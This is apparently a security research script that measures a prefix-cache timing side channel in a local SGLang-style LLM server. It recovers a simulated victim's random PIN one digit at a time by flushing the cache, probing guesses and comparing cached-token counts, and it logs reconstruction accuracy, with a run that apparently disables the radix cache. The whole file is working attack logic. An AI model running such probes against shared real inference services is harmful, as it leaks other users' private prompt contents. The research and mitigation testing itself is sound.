"""
run_pin_chained_recovery.py - Level 3+4: sequential chained PIN recovery.

Root cause found in position-2 diagnosis: the radix-tree cache matches
token-by-token from the START of the string. A probe can only test
position N correctly if positions 1..N-1 in the probe already match the
victim's real digits - otherwise the match breaks before reaching
position N. So recovery must be sequential: recover digit 1, use the
RECOVERED value (not ground truth) to build the probe for digit 2, etc.

This tests Level 3 (per-position recovery, now done correctly) and
Level 4 (full reconstruction) simultaneously, since the chained result
IS the reconstructed PIN.

Ground truth isolation: the attacker-side recovery loop only ever uses
its own previously-recovered digits to build subsequent probes. The
real ground_truth_pin is stored solely for final comparison/scoring,
never fed into the probing logic.
"""
import csv
import sys
import os
import time
import random
import requests

sys.path.insert(0, os.path.dirname(__file__))
from measure import send_request
from config import SHARED_PUBLIC_PREFIX, PIN_LENGTH, PIN_LABEL, PIN_SEPARATOR, PIN_TRAILING_MARKER

OUT_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "results", "sglang", "pin_chained_recovery_disable_radix.csv"))
FLUSH_URL = "http://localhost:30001/flush_cache"
N_TRIALS = 30
GAP_SECONDS = 1
PLACEHOLDER_DIGIT = "0"

def flush_cache():
    requests.post(FLUSH_URL, timeout=10)

def format_pin(digits: str) -> str:
    return PIN_SEPARATOR.join(list(digits))

def random_pin():
    return "".join(str(random.randint(0, 9)) for _ in range(PIN_LENGTH))

def victim_populate(pin_digits: str):
    prompt = SHARED_PUBLIC_PREFIX + PIN_LABEL + format_pin(pin_digits) + PIN_TRAILING_MARKER
    return send_request(prompt)

def attacker_probe(known_prefix_digits: str, guess_digit: str):
    # known_prefix_digits = attacker's own recovered digits so far (NOT ground truth)
    remaining = PIN_LENGTH - len(known_prefix_digits) - 1
    guess_digits = known_prefix_digits + guess_digit + PLACEHOLDER_DIGIT * remaining
    prompt = SHARED_PUBLIC_PREFIX + PIN_LABEL + format_pin(guess_digits) + PIN_TRAILING_MARKER
    return send_request(prompt)

def recover_pin(gt_pin: str, trial: int, rows: list):
    """Attacker-side recovery loop. Only ever sees its own recovered digits."""
    recovered = ""
    for position in range(PIN_LENGTH):
        best_digit = None
        best_cached = -1
        position_rows = []
        for guess in "0123456789":
            flush_cache()
            time.sleep(0.3)

            victim_populate(gt_pin)  # victim re-populates fresh cache each probe (isolated methodology)
            time.sleep(GAP_SECONDS)

            r = attacker_probe(recovered, guess)
            r.update({
                "trial": trial,
                "position": position + 1,
                "known_prefix_so_far": recovered,
                "guess_digit": guess,
                "ground_truth_pin": gt_pin,
                "ground_truth_digit_this_position": gt_pin[position],
            })
            rows.append(r)
            position_rows.append((guess, r["cached_tokens"]))

            if r["cached_tokens"] > best_cached:
                best_cached = r["cached_tokens"]
                best_digit = guess

        correct_this_position = best_digit == gt_pin[position]
        print(f"  trial={trial} position={position+1} known_prefix={recovered!r} "
              f"recovered_digit={best_digit} actual={gt_pin[position]} "
              f"{'OK' if correct_this_position else 'WRONG'}")

        recovered += best_digit  # chain forward with attacker's OWN recovered value

    return recovered

def run():
    rows = []
    full_pin_correct = 0

    for trial in range(N_TRIALS):
        gt_pin = random_pin()
        print(f"=== trial {trial} (ground truth hidden from attacker logic) ===")
        recovered_pin = recover_pin(gt_pin, trial, rows)
        is_full_match = recovered_pin == gt_pin
        full_pin_correct += is_full_match
        print(f"  --> recovered={recovered_pin} actual={gt_pin} {'FULL MATCH' if is_full_match else 'MISMATCH'}\n")

    os.makedirs(os.path.dirname(OUT_PATH), exist_ok=True)
    fieldnames = list(rows[0].keys())
    with open(OUT_PATH, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)

    print(f"\nSaved {len(rows)} rows to {OUT_PATH}")
    print(f"Full-PIN reconstruction accuracy: {full_pin_correct}/{N_TRIALS} = {full_pin_correct/N_TRIALS:.2%}")

if __name__ == "__main__":
    run()
